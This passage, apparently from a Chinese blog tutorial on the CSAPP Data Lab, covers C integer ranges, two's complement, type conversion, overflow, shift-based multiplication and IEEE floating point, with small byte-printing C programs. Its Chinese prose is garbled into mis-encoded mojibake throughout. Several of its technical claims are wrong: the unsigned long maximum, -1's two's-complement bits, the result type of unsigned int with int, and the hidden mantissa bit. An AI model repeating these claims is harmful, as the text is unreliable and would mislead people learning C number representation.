short</td><td>0</td><td>65535</td></tr><tr><td>int</td><td>-2147483648</td><td>2147483647</td></tr><tr><td>unsigned int</td><td>0</td><td>4294967295</td></tr><tr><td>long</td><td>-9223372036854775808</td><td>9223372036854775807</td></tr><tr><td>unsigned long</td><td>0</td><td>18446744037709551615</td></tr></tbody></table><p>æˆ‘ä»¬å¯ä»¥å¾ˆæ¸…æ¥šåœ°çœ‹åˆ°ï¼Œæœ‰ç¬¦å·æ•°åœ¨æ­£æ•°å’Œè´Ÿæ•°çš„èŒƒå›´å¹¶ä¸ä¸¥æ ¼å¯¹ç§°ï¼Œè¿™æ˜¯ä¸ºä»€ä¹ˆæˆ‘ä»¬æ¥ä¸‹æ¥å†çœ‹ã€‚</p><h4 id="æ— ç¬¦å·æ•°çš„ç¼–ç "><a href="#æ— ç¬¦å·æ•°çš„ç¼–ç " class="headerlink" title="æ— ç¬¦å·æ•°çš„ç¼–ç "></a>æ— ç¬¦å·æ•°çš„ç¼–ç </h4><p>æ— ç¬¦å·æ•°çš„ç¼–ç å°±æ˜¯ç”¨ä¸€ä¸ªå›ºå®šé•¿åº¦çš„å‘é‡æ¥è¡¨ç¤ºï¼Œæ¯ä¸ªç»´åº¦ä¸Šçš„å€¼å– <code>0</code> æˆ–è€… <code>1</code>ï¼Œé‚£ä¹ˆæœ‰</p><p><img src="/2022/06/03/CSAPP_Datalab/3.png" alt="3"></p><p>è¿™ä¸ªæ˜¯æˆ‘ä»¬æœ€å®¹æ˜“ç†è§£çš„ã€‚</p><h4 id="è¡¥ç ç¼–ç "><a href="#è¡¥ç ç¼–ç " class="headerlink" title="è¡¥ç ç¼–ç "></a>è¡¥ç ç¼–ç </h4><p>æœ‰ç¬¦å·æ•°å› ä¸ºéœ€è¦è¡¨ç¤ºè´Ÿæ•°ï¼Œå› æ­¤å®ƒè§„å®šï¼šæœ€é«˜ä½çš„æƒå€¼ä¸ºè´Ÿã€‚</p><p>ä¹Ÿå°±æ˜¯è¯´è‹¥æœ€é«˜ä½ä¸º1ï¼Œè€Œæˆ‘ä»¬çŸ¥é“ï¼Œåœ¨ç­‰æ¯”æ•°åˆ— <code>ai=2^i</code> ä¸­ï¼Œæ•°åˆ—çš„å‰né¡¹å’Œæ°¸è¿œæ¯”ç¬¬ <code>n+1</code> é¡¹å° <code>1</code>ï¼Œæ ¹æ®ç­‰æ¯”æ•°åˆ—å‰ <code>n</code> é¡¹å’Œçš„å…¬å¼ã€‚å› æ­¤è‹¥æœ€é«˜ä½ä¸º1ï¼Œé‚£ä¹ˆå…¶å®ƒä½ä¸ç®¡æ˜¯æ˜¯æ€æ ·éƒ½ä¸ä¼šä½¿è¿™ä¸ªæ•°å˜ä¸ºä¸€ä¸ªæ­£æ•°ã€‚è€Œå‰ <code>n-1</code> é¡¹å¯ä»¥è¡¨ç¤º <code>0~2^n-1</code> çš„èŒƒå›´ï¼Œæ‰€ä»¥è´Ÿæ•°çš„èŒƒå›´å°±æ˜¯<code>-2^n+0~-2^n+2^n-1</code> ä¹Ÿå°±æ˜¯æˆ‘ä»¬ç†ŸçŸ¥çš„ <code>-2^n~-1</code> å†åŠ ä¸Šæ­£æ•°è¡¨ç¤ºçš„ <code>0~2^n-1</code> è¿èµ·æ¥çš„èŒƒå›´å°±æ˜¯ <code>-2^n~2^n-1</code> å•¦ã€‚</p><h4 id="æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢"><a href="#æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢" class="headerlink" title="æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢"></a>æœ‰ç¬¦å·ä¸æ— ç¬¦å·æ•°ä¹‹é—´çš„è½¬æ¢</h4><p>éšå¼è½¬æ¢æŒ‰é¡ºåºéµä»ä»¥ä¸‹åŸåˆ™ï¼š</p><ol><li>æµ®ç‚¹æ•°å‚ä¸è¿ç®—å°±æ˜¯æµ®ç‚¹æ•°ï¼Œå‡ºç°è¿‡doubleåˆ™ç»“æœä¸€å®šä¸ºdouble</li><li>è‹¥éƒ½æ˜¯æ•´æ•°å‚ä¸è¿ç®—åˆ™ç»“æœä¹Ÿæ˜¯æ•´æ•°</li><li>æ•´æ•°è¿ç®—çš„ç»“æœä¸ºå‡ºç°è¿‡çš„ä½æ•°æœ€å¤§çš„æ•´æ•°ï¼Œè‹¥æœ€å¤§çš„æ•´æ•°ä¸­æœ‰æ— ç¬¦å·ç±»å‹çš„åˆ™ç»“æœæ— ç¬¦å·ã€‚</li></ol><p>å› æ­¤ï¼Œå¦‚æœ</p><ul><li>è¿ç®—ä¸­æœ‰ <code>unsigned short</code> å’Œ <code>int</code> åˆ™ç»“æœä¸º <code>int</code>ã€‚</li><li>è¿ç®—ä¸­æœ‰ <code>unsigned int</code> å’Œ <code>int</code> åˆ™ç»“æœä¸º <code>int</code>ã€‚</li><li>è¿ç®—ä¸­æœ‰ <code>unsigned int</code> å’Œ <code>float</code> åˆ™ç»“æœä¸º <code>float</code>ã€‚</li></ul><p>ä¹Ÿå°±ä¸ä¸€ä¸€åˆ—ä¸¾äº†ã€‚</p><p>æœ‰ç¬¦å·ä¸æ— ç¬¦å·çš„ä½äºåŒºåˆ«å°±æ˜¯æœ€é«˜ä½çš„æƒå€¼æ­£è´Ÿé—®é¢˜ï¼Œæ¯”è¾ƒçš„æ—¶å€™ä»»æ„ä¸€æ–¹å‡ºç°æ— ç¬¦å·åˆ™å¦ä¸€æ–¹ä¹Ÿä¼šå˜æˆæ— ç¬¦å·æ¯”è¾ƒï¼Œæ‰€ä»¥å¦‚æœæˆ‘ä»¬åšä»¥ä¸‹è¿ç®—ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">-1</span>&lt;(<span class="keyword">unsigned</span>)<span class="number">1</span></span><br></pre></td></tr></table></figure><p>ä¼šå‘ç°å®ƒç»“æœä¸º0.</p><p>å› ä¸º <code>-1</code> çš„è¡¥ç å…¨ä¸º <code>0</code>ï¼Œè½¬ä¸ºæ— ç¬¦å·ä¹‹åä¼šå˜æˆæ— ç¬¦å·æ•´æ•°çš„æœ€å¤§å€¼ã€‚</p><h4 id="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º"><a href="#æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º" class="headerlink" title="æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º"></a>æ‰©å±•ä¸€ä¸ªæ•°å­—çš„è¡¨ç¤º</h4><p>å°†ä¸€ä¸ªä½æ•°è¾ƒå°çš„æ•´æ•°æ‰©å±•ä¸ºä½æ•°è¾ƒå¤§çš„æ•´æ•°éå¸¸ç®€å•ï¼Œæˆ‘ä»¬åªéœ€è¦åœ¨å¼€å¤´æ·»åŠ  <code>0</code> å³å¯ï¼Œä½†æ˜¯å¦‚æœæ˜¯è´Ÿæ•°ï¼Œåˆ™éœ€è¦å¼€å¤´æ·» <code>1</code>ï¼Œæˆ‘ä»¬è¿è¡Œä»¥ä¸‹ä»£ç è¯•è¯•çœ‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">short</span> x=<span class="number">0x1234</span>;</span><br><span class="line"><span class="keyword">short</span> y=<span class="number">-0x1234</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">show_bytes(&amp;y,<span class="keyword">sizeof</span>(y));</span><br><span class="line"><span class="keyword">int</span> x1=x;</span><br><span class="line"><span class="keyword">int</span> y1=y;</span><br><span class="line">show_bytes(&amp;x1,<span class="keyword">sizeof</span>(x1));</span><br><span class="line">show_bytes(&amp;y1,<span class="keyword">sizeof</span>(y1));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œå¯ä»¥çœ‹åˆ°ç»“æœå¦‚æˆ‘ä»¬æ‰€è¯´ã€‚</p><p><img src="/2022/06/03/CSAPP_Datalab/4.png" alt="4"></p><h4 id="æˆªæ–­æ•°å­—"><a href="#æˆªæ–­æ•°å­—" class="headerlink" title="æˆªæ–­æ•°å­—"></a>æˆªæ–­æ•°å­—</h4><p>æœ‰æ‰©å±•ï¼Œè‡ªç„¶æœ‰æˆªæ–­ï¼Œå½“è¿ç®—çš„ç»“æœå¯èƒ½è¶…å‡ºç±»å‹æ‰€èƒ½è¡¨ç¤ºçš„æœ€å¤§èŒƒå›´çš„æ—¶å€™ï¼Œå°±ä¼šå‘ç”Ÿæº¢å‡ºã€‚</p><p>åœ¨æ— ç¬¦å·æ•°æˆ–è€…æ­£æ•°å½“ä¸­ï¼Œæˆªæ–­ä¸º <code>w</code> ä½çš„æ•´æ•°å°±ç›¸å½“äºå–æ¨¡ <code>2^w</code> ï¼Œä½†æ˜¯æˆªæ–­æœ‰è´Ÿæ•´æ•°çš„æ—¶å€™å°±ä¼šå‘ç”Ÿæ„æƒ³ä¸åˆ°çš„äº‹æƒ…ã€‚æ¯”å¦‚è´Ÿæ•°æœ€å°å€¼å†å‡ä¸€é‚£ä¹ˆåšçš„è¿ç®—å°±æ˜¯ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"> 0x80000000</span><br><span class="line"> 0xFFFFFFFF</span><br><span class="line">0x17FFFFFFF</span><br></pre></td></tr></table></figure><p>æ˜¾ç„¶å¤šäº†ä¸€ä½ï¼Œé«˜ä½è¢«æˆªæ–­ï¼Œæœ€ç»ˆç»“æœä¸º <code>0x7FFFFFFF</code> ï¼Œä¸¤ä¸ªè´Ÿæ•°ç›¸åŠ ç»“æœå¾—å‡ºäº†æ­£æ•°ï¼Œè¿™æ˜¾ç„¶è¶…å‡ºäº†æˆ‘ä»¬çš„è®¤çŸ¥èŒƒå›´ã€‚è¿™ä¸ªæˆ‘ä»¬å«å®ƒè´Ÿæº¢å‡ºã€‚å†çœ‹ä¸€ä¸ªä¾‹å­ï¼šæ­£æ•°çš„æœ€å¤§å€¼åŠ  <code>1</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0x7FFFFFFF</span><br><span class="line">0x00000001</span><br><span class="line">0x80000000</span><br></pre></td></tr></table></figure><p>ç»“æœæ˜¯è´Ÿæ•°çš„æœ€å¤§å€¼ï¼Œä¸¤ä¸ªæ­£æ•°ç›¸åŠ å¾—å‡ºäº†è´Ÿæ•°ï¼Œæ˜¾ç„¶ä¹Ÿä¸åˆç†ï¼Œè¿™ä¸ªæˆ‘ä»¬å«ä»–æ­£æº¢å‡ºï¼Œä½†æ˜¯æ­£æº¢å‡ºå¹¶æ²¡æœ‰å‘ç”Ÿæˆªæ–­ï¼Œè€Œè´Ÿæº¢å‡ºæ˜¯ç”±æˆªæ–­å¼•èµ·çš„ã€‚</p><blockquote><p>è®¡ç®—æœºå†å²ä¸Šï¼Œæœ‰å¾ˆå¤šå®‰å…¨æ¼æ´éƒ½æ˜¯å› ä¸ºæœ‰ç¬¦å·å’Œæ— ç¬¦å·çš„æ­£æ•°å¼•èµ·çš„</p></blockquote><h4 id="æ— ç¬¦å·ä¹˜æ³•"><a href="#æ— ç¬¦å·ä¹˜æ³•" class="headerlink" title="æ— ç¬¦å·ä¹˜æ³•"></a>æ— ç¬¦å·ä¹˜æ³•</h4><p>å¯¹äºä¹˜æ³•æœ‰ <code>x*y=(x*y) mod 2^w</code> å…¶ä¸­ <code>w</code> ä¸º <code>x </code> å’Œ <code>y</code> çš„ä½æ•°ã€‚å› ä¸º <code>x</code> å’Œ <code>y</code> ç›¸ä¹˜å¯èƒ½å¾—åˆ°æœ€å¤§ <code>2w</code> ä½çš„æ•´æ•°ï¼Œå› æ­¤ä¼šå‘ç”Ÿæˆªæ–­ï¼Œå¯¹äºæ— ç¬¦å·æ¥è¯´ï¼Œæˆªæ–­å°±ç›¸å½“äºå¯¹ <code>2^w</code> å–æ¨¡ ã€‚</p><h4 id="è¡¥ç ä¹˜æ³•"><a href="#è¡¥ç ä¹˜æ³•" class="headerlink" title="è¡¥ç ä¹˜æ³•"></a>è¡¥ç ä¹˜æ³•</h4><p>è¿™ä¸ªä¹˜æ³•å°±ç›¸å½“äºå…ˆåƒæ— ç¬¦å·ä¹˜æ³•ï¼Œä¹˜å‡ºæ¥æˆªæ–­ä¹‹åå†è½¬ä¸ºè¡¥ç å°±æ˜¯ç»“æœã€‚</p><h4 id="ä¹˜å¸¸æ•°"><a href="#ä¹˜å¸¸æ•°" class="headerlink" title="ä¹˜å¸¸æ•°"></a>ä¹˜å¸¸æ•°</h4><p>å› ä¸ºæˆ‘ä»¬çŸ¥é“ä¸€ä¸ªç‰¹æ€§ï¼šç§»ä½è¿ç®—ç›¸å½“äºå¯¹ <code>2^x</code> åšä¹˜é™¤æ³•ï¼Œå› æ­¤åˆ©ç”¨è¿™ä¸ªç‰¹æ€§æˆ‘ä»¬èƒ½æŠŠä¹˜æ³•è½¬æˆç§»ä½è¿ç®—ï¼Œæ‰§è¡Œä¹˜æ³•æŒ‡ä»¤çš„æ—¶é—´æ¯”å…¶å®ƒæŒ‡ä»¤æ—¶é—´è¦é•¿çš„å¤šï¼Œå› æ­¤å¾ˆå¤šç¼–è¯‘å™¨åœ¨ç¼–è¯‘å¸¸æ•°ä¹˜æ³•çš„æ—¶å€™ä¼šæŠŠå¸¸æ•°äºŒè¿›åˆ¶æ‹†å¼€ç„¶ååˆ†åˆ«ç›¸ä¹˜ç›¸åŠ ã€‚</p><p>æ¯”å¦‚ä¹˜9ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">9</span>=<span class="number">0b1001</span></span><br><span class="line">x*<span class="number">9</span>=x*<span class="number">8</span>+x*<span class="number">1</span>=(x&lt;&lt;<span class="number">3</span>)+(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p> ä½†æ˜¯æˆ‘ä»¬ä¼šå‘ç°ä¸€ä¸ªé—®é¢˜ï¼šå¦‚æœ1çš„ä½æ•°å¾ˆå¤šé‚£å°±ç›¸å½“äºè¦åšå¾ˆå¤šæ¬¡ç§»ä½å’ŒåŠ æ³•ï¼Œæœ€åçš„å¤æ‚åº¦å¯èƒ½è·Ÿä¹˜æ³•æŒ‡ä»¤å·®ä¸å¤šï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥é€šè¿‡å¦å¤–ä¸€ç§å§¿åŠ¿é¿å…è¿™ä¸ªé—®é¢˜ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">15</span>=<span class="number">0b1111</span>=<span class="number">0b10000</span><span class="number">-0b</span>1</span><br><span class="line">x*<span class="number">15</span>=x*<span class="number">16</span>-x*<span class="number">1</span>=(x&lt;&lt;<span class="number">4</span>)-(x&lt;&lt;<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>é€šè¿‡å€Ÿä¸€ä¸ªé«˜ä½ï¼Œå…¶ä½™ä½æƒå€¼å–åä¹‹åå†åŠ 1çš„æ–¹å¼é¿å…äº†è¿›è¡Œå¤§é‡çš„è¿ç®—ã€‚</p><h4 id="é™¤2çš„å¹‚"><a href="#é™¤2çš„å¹‚" class="headerlink" title="é™¤2çš„å¹‚"></a>é™¤2çš„å¹‚</h4><p>å¯¹äº2çš„å¹‚ï¼Œéå¸¸ç®€å•ï¼Œå³ç§»è¿ç®—å³å¯ï¼Œä½†æ˜¯éœ€è¦æ³¨æ„ï¼šé™¤æ³•æ²¡æœ‰åˆ†é…å¾‹ï¼Œæ‰€ä»¥ä¹˜å¸¸æ•°çš„æ–¹å¼å¹¶ä¸é€‚ç”¨äºé™¤æ³•ã€‚é™¤æ³•ä¼šå‘é›¶å–æ•´ï¼Œæ¯”å¦‚ç®—å‡ºæ¥ç»“æœä¸º <code>3.5</code> åˆ™ä¼šå˜æˆ <code>3</code>ï¼Œç®—å‡ºæ¥ç»“æœ <code>-3.5</code> åˆ™ä¼šå˜æˆ <code>-3</code>ã€‚</p><h3 id="æµ®ç‚¹æ•°è¡¨ç¤º"><a href="#æµ®ç‚¹æ•°è¡¨ç¤º" class="headerlink" title="æµ®ç‚¹æ•°è¡¨ç¤º"></a>æµ®ç‚¹æ•°è¡¨ç¤º</h3><p>æ˜¾ç„¶æ•´æ•°å¹¶ä¸èƒ½æ»¡è¶³æˆ‘ä»¬å¹³æ—¶çš„éœ€è¦ï¼Œå¹³æ—¶è¿˜éœ€è¦è¿›è¡Œå¤§é‡çš„æµ®ç‚¹æ•°è¿ç®—ï¼Œè¾¾åˆ°å¤ªé˜³çš„è´¨é‡ï¼Œå°åˆ°ç”µå­çš„è´¨é‡ï¼Œéƒ½éœ€è¦èƒ½åœ¨è®¡ç®—æœºä¸­è¡¨ç¤ºã€‚è€Œè¿™ä¸ªèŒƒå›´è¦ç”¨æ•´æ•°çš„æ€è·¯è¡¨ç¤ºæ˜¾ç„¶æ˜¯ä¸è¡Œçš„ï¼Œå› æ­¤æˆ‘ä»¬éœ€è¦æœ‰ç‰¹æ®Šçš„è¡¨ç¤ºæ–¹æ³•ã€‚</p><h4 id="äºŒè¿›åˆ¶å°æ•°"><a href="#äºŒè¿›åˆ¶å°æ•°" class="headerlink" title="äºŒè¿›åˆ¶å°æ•°"></a>äºŒè¿›åˆ¶å°æ•°</h4><p>æˆ‘ä»¬éƒ½çŸ¥é“åè¿›åˆ¶çš„å°æ•°ï¼Œå°æ•°ç‚¹å·¦è¾¹çš„æ•°å­—ä½çš„æƒå€¼ä» <code>10^0</code> å¼€å§‹ï¼ŒæŒ‡æ•°é€ä½é€’å¢ï¼Œè€Œå°æ•°ç‚¹å³è¾¹çš„æ•°å­—çš„ä½çš„æƒå€¼ä» <code>10^(-1)</code> å¼€å§‹ï¼Œé€ä½é€’å‡ã€‚</p><p>äºŒè¿›åˆ¶åŒç†ï¼Œåªä¸è¿‡æƒå€¼çš„åº•æ•°éƒ½å˜æˆäº† <code>2</code>ã€‚</p><h4 id="IEEEæµ®ç‚¹æ•°è¡¨ç¤º"><a href="#IEEEæµ®ç‚¹æ•°è¡¨ç¤º" class="headerlink" title="IEEEæµ®ç‚¹æ•°è¡¨ç¤º"></a>IEEEæµ®ç‚¹æ•°è¡¨ç¤º</h4><p>è¿™ä¸ªæ ‡å‡†è§„å®šçš„æµ®ç‚¹æ•°ç”¨å¦‚ä¸‹æ–¹å¼è¡¨ç¤ºï¼š</p><p><img src="/2022/06/03/CSAPP_Datalab/5.png" alt="5"></p><p>é‡Œé¢åŒ…å«äº†</p><ul><li>ç¬¦å·(s)ï¼š<code>1</code> è¡¨ç¤ºè´Ÿæ•°ï¼Œ<code>0</code> è¡¨ç¤ºæ­£æ•°</li><li>å°¾æ•°(M)ï¼šæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶çš„å°æ•°ï¼Œå–å€¼èŒƒå›´ä¸º <code>[1,2)</code></li><li>é˜¶ç (E)ï¼šä¸ºæµ®ç‚¹æ•°åŠ æƒã€‚</li></ul><p>å…¶å®è¿™ä¸ªå®šä¹‰å°±ç›¸å½“äºäºŒè¿›åˆ¶çš„ç§‘å­¦è®¡æ•°æ³•ï¼Œæƒ³æƒ³åŸæ¥ç§‘å­¦è®¡æ•°æ³•çš„å®šä¹‰æ˜¯ä¸æ˜¯èƒ½æ›´æ¸…æ™°åœ°ç†è§£å®ƒäº†å‘¢ï¼Ÿ</p><p>è®²å®Œç†è®ºæ¥è®²ç‚¹å®é™…çš„ï¼š</p><p>æˆ‘ä»¬çŸ¥é“å®é™…ä¸Šæˆ‘ä»¬ç»å¸¸ç”¨çš„æµ®ç‚¹æ•°æœ‰ä¸¤ç±»ï¼Œä¸€ç±»æ˜¯ <code>float</code> ä¸€ç±»æ˜¯ <code>double</code>ï¼Œ<code>float</code> ä¸º <code>32</code> ä½ï¼Œ<code>double</code> ä¸º <code>64</code> ä½ã€‚</p><ul><li>å¯¹äº <code>float</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼Œç¬¬ <code>2</code> åˆ°ç¬¬ <code>9</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç¬¬ <code>10</code> ä½åˆ°ç¬¬ <code>32</code> ä½å‡ä¸ºå°¾æ•°</li><li>å¯¹äº <code>double</code>ï¼Œæœ€é«˜ä½è¡¨ç¤ºç¬¦å·ä½ï¼Œç¬¬ <code>2</code> åˆ°ç¬¬ <code>12</code> ä½è¡¨ç¤ºé˜¶ç ï¼Œç¬¬ <code>13</code> ä½åˆ°ç¬¬ <code>64</code> ä½å‡ä¸ºå°¾æ•°</li></ul><p>æˆ‘ä»¬å…·ä½“ä»¥ <code>float</code> æ¥åˆ†æï¼š</p><p>ç¬¬ä¸€ä½æ˜¯ç¬¦å·ä½æ²¡å•¥å¤§é—®é¢˜ã€‚åé¢çš„å…«ä½æ˜¯æŒ‡æ•°ï¼Œè¿™ä¸ªæŒ‡æ•°éœ€è¦èƒ½è¡¨ç¤ºæ— ç©·å¤§ï¼Œä¹Ÿè¦èƒ½è¡¨ç¤ºæ— ç©·å°ï¼Œå› æ­¤æŒ‡æ•°å¿…é¡»æœ‰æ­£æœ‰è´Ÿã€‚æˆ‘ä»¬å®šä¹‰ä¸€ä¸ªæ•° <code>Bias=2^(k-1)-1</code> å…¶ä¸­ <code>k</code> ä¸ºé˜¶ç çš„ä½æ•°ï¼Œåœ¨ <code>float</code> ä¸­ï¼Œè¿™ä¸ªå€¼ä¸º <code>127</code>ï¼Œåœ¨ <code>double</code> ä¸­ï¼Œè¿™ä¸ªå€¼ä¸º <code>1023</code>ã€‚é˜¶ç å®é™…å€¼ <code>E=e-Bias</code>ï¼Œå…¶ä¸­ <code>e</code> è¡¨ç¤ºé˜¶ç æœ¬èº«çš„æ— ç¬¦å·äºŒè¿›åˆ¶çš„æ•°å€¼ã€‚ç„¶åå°±æ˜¯è¿™ä¸ªå°¾æ•°äº†ï¼Œå› ä¸ºæˆ‘ä»¬çš„èŒƒå›´æ˜¯ <code>[1,2)</code>ï¼Œåœ¨è¿™ä¸ªèŒƒå›´å†…çš„å°é¼ ï¼Œä¸éš¾å‘ç°å°æ•°ç‚¹å‰æœ‰ä¸€ä½ä¸€ç›´æ˜¯ <code>0</code>ï¼Œå› æ­¤è¿™ä¸ª <code>0</code> æˆ‘ä»¬å°±ä¸å¿…å¤šèŠ±ä¸€ä½å­˜å‚¨å®ƒäº†ï¼Œå› æ­¤æˆ‘ä»¬çš„å°¾æ•°éƒ½æ˜¯å°æ•°ç‚¹åçš„å€¼ã€‚</p><p>å¦‚æœä¸€ä¸ª <code>32</code> ä½æµ®ç‚¹æ•°åœ¨å†…å­˜ä¸­çš„äºŒè¿›åˆ¶è¡¨ç¤ºå¦‚ä¸‹ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">bin:<span class="number">0b01000000010000000000000000000</span></span><br><span class="line">hex:<span class="number">0x40400000</span></span><br></pre></td></tr></table></figure><p>é‚£ä¹ˆå¯ä»¥å‘ç°å®ƒæ˜¯æ­£æ•°ï¼Œé˜¶ç ä¸º <code>128</code>ï¼Œå°¾æ•°ä¸º <code>100000â€¦â€¦</code>ï¼Œå› ä¸ºå°æ•°ç‚¹åé¢çš„0éƒ½èƒ½å¿½ç•¥ï¼Œå› æ­¤å°¾æ•°å®é™…å°±æ˜¯ <code>1</code>ã€‚ç„¶åæ³¨æ„è¿™ä¸ªé˜¶ç å¹¶ä¸æ˜¯çœŸæ­£çš„å®é™…å€¼ï¼Œè¿™åªæ˜¯å®ƒè¡¨é¢ä¸Šçœ‹ä¸Šå»çš„å€¼ï¼Œå†ç»™å®ƒå‡å»ä¸€ä¸ª <code>127</code> ä¹‹åå¯ä»¥å‘ç°æŒ‡æ•°ä¸º <code>1</code>ã€‚å°æ•°ä½æ•°å› ä¸ºæœ‰ä¸€ä¸ªéšå«çš„ <code>1</code>ï¼Œæ‰€ä»¥å®ƒçš„å®é™…å€¼ä¸º <code>1.1</code>ï¼Œåè¿›åˆ¶å€¼å°±æ˜¯ <code>1.5</code>ï¼Œæ‰€ä»¥æœ€åç»“æœå°±æ˜¯ <code>1.5*2^1=3</code>ã€‚</p><p>ç„¶åæˆ‘ä»¬å†è¿è¡Œç¨‹åºçœ‹çœ‹ <code>3</code> çš„å­—èŠ‚æ˜¾ç¤ºã€‚</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">show_bytes</span><span class="params">(<span class="keyword">void</span> *start,<span class="keyword">size_t</span> len)</span></span>&#123;    </span><br><span class="line"><span class="keyword">size_t</span> i;</span><br><span class="line"><span class="keyword">for</span>(i=<span class="number">0</span>;i&lt;len;i++)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%.2x &quot;</span>,*(<span class="keyword">unsigned</span> <span class="keyword">char</span> *)(start+i));</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">float</span> x=<span class="number">3.0</span>;</span><br><span class="line">show_bytes(&amp;x,<span class="keyword">sizeof</span>(x));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿è¡Œä¹‹åå¯ä»¥å‘ç°ä¸æˆ‘ä»¬ä¸Šé¢ä¹¦å†™çš„åå…­è¿›åˆ¶å€¼ä¸€è‡´ã€‚</p><p>æµ®ç‚¹æ•°è¿˜æœ‰ <code>3 </code>ä¸­è¡¨ç¤ºå€¼çš„æƒ…å†µã€‚</p><ol><li>è§„æ ¼åŒ–çš„å€¼ï¼šè¿™æ˜¯æœ€æ™®éçš„æƒ…å†µï¼Œé˜¶ç ä½ä¸ä¸ºå…¨ <code>0</code> ä¹Ÿä¸ä¸ºå…¨ <code>1</code>.</li><li>éè§„æ ¼åŒ–çš„å€¼ï¼šå½“é˜¶ç ä½å…¨ä¸º <code>0</code> çš„æ—¶å€™ï¼Œè¡¨ç¤ºéè§„æ ¼åŒ–çš„å€¼ï¼Œè¿™ä¸ªéè§„æ ¼åŒ–çš„æ„æ€å°±æ˜¯è·Ÿæˆ‘ä»¬ä¸Šé¢ä»‹ç»çš„è§„å¾‹ç¨ç¨æœ‰ç‚¹ä¸ä¸€æ ·ï¼Œæ­¤æ—¶å°¾æ•°æ˜¯ä¸å¸¦éšå«çš„ <code>1</code> çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å®ƒçš„æœ‰æ•ˆæ•°å­—ç›´æ¥æ˜¯ä»å°¾æ•°å¼€å§‹çš„ï¼Œå› æ­¤å®ƒå’Œé˜¶ç ä½æ¨¡å¼ä¸º<code>00000001</code> çš„æŒ‡æ•°ä¸€æ ·ï¼Œä½†æ˜¯æœ‰æ•ˆæ•°å­—å¤šä¸€ä¸ªå°æ•°ç‚¹å‰çš„ <code>1</code>ï¼Œå› ä¸ºè¿™æ ·è¡¨ç¤ºèƒ½å¤Ÿä½¿å¾—éè§„æ ¼åŒ–æ•°å€¼å‘è§„æ ¼åŒ–æ•°å€¼è½¬åŒ–æ›´ä¸ºå¹³æ»‘ã€‚</li><li>ç‰¹æ®Šå€¼ï¼šåŒ…æ‹¬ <code>INF</code> å’Œ <code>NAN</code>ï¼Œé˜¶ç ä½å…¨ä¸º <code>1</code> çš„æ—¶å€™ï¼Œè‹¥å°¾æ•°å…¨ä¸º0ï¼Œåˆ™å¾—åˆ° <code>INF</code>ï¼Œè‹¥ä¸å…¨ä¸º <code>0</code> 